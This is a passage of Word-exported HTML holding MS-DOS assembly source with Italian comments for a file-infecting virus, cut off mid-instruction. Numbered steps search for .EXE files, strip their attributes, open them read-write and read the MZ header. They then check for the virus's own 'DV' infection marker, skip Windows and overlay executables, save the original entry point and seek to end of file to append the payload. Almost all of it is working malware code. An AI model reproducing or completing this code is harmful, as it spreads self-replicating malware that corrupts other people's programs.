<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes"> </span><span style="mso-spacerun:
yes">  </span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#C7DB65'>; ----------------- Punto 2 – Salva parti dell’header nellostack
---------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; _cs è
l’indirizzo usato dalla nostra istruzione di JMP per tornare all’host<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; exe_cs è
il registro CS originale<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ax,word ptr [bp+exe_cs]<span style="mso-spacerun: yes">   </span>;eguaglia _cs
a exe_cs<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov word ptr [bp+_cs],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>;salva CS:IP e SS:SP
nello stack<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>push [bp+exe_cs]<span style="mso-spacerun: yes">             
</span>;save CS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>push [bp+exe_ip]<span
style="mso-spacerun: yes">              </span>;save IP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>push [bp+exe_ss]<span
style="mso-spacerun: yes">              </span>;save SS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>push [bp+exe_sp]<span
style="mso-spacerun: yes">              </span>;save SP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>;
-------------------------- Punto 3 – Setta un nuovo DTA ----------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ah,1ah<span style="mso-spacerun: yes">                   
</span>;funzione DOS=Set Disk Transfer Address<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>lea dx,[bp+offset
dta]<span style="mso-spacerun: yes">        </span>;setta un nuovo buffere per
DTA <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">  </span>; ------------------------- Punto 4 – cerca
un EXE -----------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ah,4eh<span style="mso-spacerun: yes">                    </span>;funzione
DOS=cerca il primo file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>lea
dx,[bp+filespec]<span style="mso-spacerun: yes">          </span>;cerca solo
files (*.EXE)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
cx,7<span style="mso-spacerun: yes">                      </span>;qualsiasi
attributo<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>facciamolo:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jnc
prossimo<span style="mso-spacerun: yes">                 </span>;se non c’è
errore continua<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
exit<span style="mso-spacerun: yes">                     </span>;se errore
ritorna il controllo all’host<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>prossimo:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
----------------------- Punto 5 – leggo gli attributi ------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ax,4300h<span style="mso-spacerun: yes">                  </span>;funzione
DOS=Get File Attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>lea
dx,[bp+offset dta+1eh]<span style="mso-spacerun: yes">    </span>;leggo il nome
file dal DTA (offset 1eh)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
word ptr [bp+file_attr],cx<span style="mso-spacerun: yes">      </span>;salvo
gli attributi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes"> </span>; ----------------- Punto 6 – Setta i nuovi
attributes (solo archivio) ---------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ax,4301h<span style="mso-spacerun: yes">                  </span>;funzione
DOS=Set File Attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>lea
dx,[bp+offset dta+1eh]<span style="mso-spacerun: yes">    </span>;legge il nome
file dal (offset 1eh)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
cx,cx<span style="mso-spacerun: yes">                </span><span
style="mso-spacerun: yes">     </span>;setta attributi “archive only”<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------- Punto 7 – Apre il file per RW (read-write) ---------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ax,3d02h<span style="mso-spacerun: yes">                 
</span>;funzione DOS=Open File For Read-Write<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>lea dx,[bp+offset
dta+1eh]<span style="mso-spacerun: yes">    </span>;legge il<span
style="mso-spacerun: yes">  </span>nome file da DTA (offset 1eh)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jnc
continua<span style="mso-spacerun: yes">                  </span>;se no errore,
continua<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
abort<span style="mso-spacerun: yes">                     </span>;se errore
rimette i vecchi attributi e cerca un <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;altro file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>continua:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xchg
bx,ax<span style="mso-spacerun: yes">                    </span>;mette l’ahndle
del file in bx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------------ Punto 8 – legge<span style="mso-spacerun: yes"> 
</span>il time/date del file --------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ax,5700h<span style="mso-spacerun: yes">                 
</span>;funzione DOS=Get File Time/Date<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr
[bp+file_time],cx<span style="mso-spacerun: yes">      </span>;salva ora<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr
[bp+file_date],dx<span style="mso-spacerun: yes">      </span>;salva data<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>;
------------------------ Punto 9 – legge l’header ----------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ah,3fh<span style="mso-spacerun: yes">                   
</span>;funzione DOS=Read From File<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov cx,1ch<span
style="mso-spacerun: yes">                    </span>;legge l’EXE header (1ch
bytes)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>lea dx,[bp+offset
header]<span style="mso-spacerun: yes">     </span>;salva in buffer 'header' <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
----------------- Punto 10 – controlla se il file è un EXE reale -------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>cmp
word ptr [bp+header],'ZM' ;controlla se i primi 2 bytes sono MZ or ZM<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>je
infetta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>cmp word ptr [bp+header],'MZ'<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>je infetta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
un_altro<span style="mso-spacerun: yes">                  </span>;se non uguale
allore il file non è un reale EXE<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;ed è un file ridenominato<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>infetta:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
-------------- Punto 11 – controlla se il file è già infettato ---------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>cmp
word ptr [bp+header+10h],'DV'<span style="mso-spacerun: yes">  
</span>;controlla per i nostri ID bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jne
fatto<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
un_altro<span style="mso-spacerun: yes">                   </span>;se uguale
allora il file è già stato infettato<span style="mso-spacerun:
yes">                                   </span>;infettato<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>fatto:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
--------------- Punto 12 – controlla se il file è un Windows EXE -------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes"> </span>;Nota: si
potrebbe anche controllare se è NE or PE comparando se è più grande di 64<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">    </span>cmp byte ptr [bp+header+18h],'@'<span
style="mso-spacerun: yes">    </span>;controlla se il file è un WinEXE<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jne
no_win<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
un_altro<span style="mso-spacerun: yes">                   </span>;è un WinEXE
here. non possiamo infettarlo in <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;questo modo….<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>no_win:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------- Punto 13 – controlla se il file ha internal overlays -----------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>cmp word ptr [bp+header+1ah],0<span style="mso-spacerun: yes">     
</span>;controlla per internal overlays<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>je no_overlay<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
un_altro<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>no_overlay:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>push
bx<span style="mso-spacerun: yes">                       </span>;salva il file
handle<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
-------------- Punto 14 - Salva parti importanti dall’header -----------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ax,word ptr [bp+header+0eh]<span style="mso-spacerun: yes">     
</span>;salva SS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr [bp+exe_ss],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov ax,word ptr
[bp+header+10h]<span style="mso-spacerun: yes">      </span>;salva SP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr [bp+exe_sp],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov ax,word ptr
[bp+header+14h]<span style="mso-spacerun: yes">      </span>;salva IP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr [bp+exe_ip],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov ax,word ptr
[bp+header+16h]<span style="mso-spacerun: yes">      </span>;salva CS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr [bp+exe_cs],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>; ------------------- Punto 15
– andiamo a EOF (end of file) ------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov ax,4202h<span
style="mso-spacerun: yes">                  </span>;funzione DOS=Set File
Pointer (Seek) a EOF<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>xor cx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>cwd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>push ax
dx<span style="mso-spacerun: yes">                    </span>;ax e dx
contengono la misura del file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
---------------- Punto 16 – Calcolo il nuovo indirizzo di CS:IP<span
style="mso-spacerun: yes">  </span>------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; Abbiamo
bisogno di prendere la misura dell’header in paras. Poi dobbiamo<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
convertirla in bytes (moltiplicandola per 16). Dopodiché dobbiamo sottrarre la <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; misura
dell’header dall misura del file e ripristinarla nella forma seg:ofs. <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; Noi
faremo questo dividendola per 16.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
